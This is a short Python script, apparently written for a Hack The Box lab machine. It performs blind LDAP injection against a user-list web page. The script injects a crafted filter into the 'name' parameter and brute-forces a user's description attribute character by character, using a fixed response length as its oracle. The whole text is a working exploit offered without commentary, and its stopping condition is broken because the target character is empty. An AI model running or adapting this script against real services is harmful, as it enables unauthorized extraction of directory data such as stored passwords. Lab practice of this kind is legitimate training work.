import requests
base_url = "http://internal.analysis.htb/users/list.php?name="
def make_request(param):
    url = base_url + param
    response = requests.get(url)
    return response.text
def find_character(target_char):
    current_param = ""
    all_characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=<>?/.,;:[]{}|\`~ "
    while True:
        for char in all_characters:
            new_param = "*)(%26(objectClass=user)(description=" + current_param + char + "*)"
            response = make_request(new_param)
            print(new_param + "   " + str(len(response)))
            if len(response) == 418:
                current_param += char
                print("Found character:", char)
                if char == target_char:
                    print("Target character found:", target_char)
                    return current_param
target_character = ''
result_param = find_character(target_character)
print("Description: ", result_param)
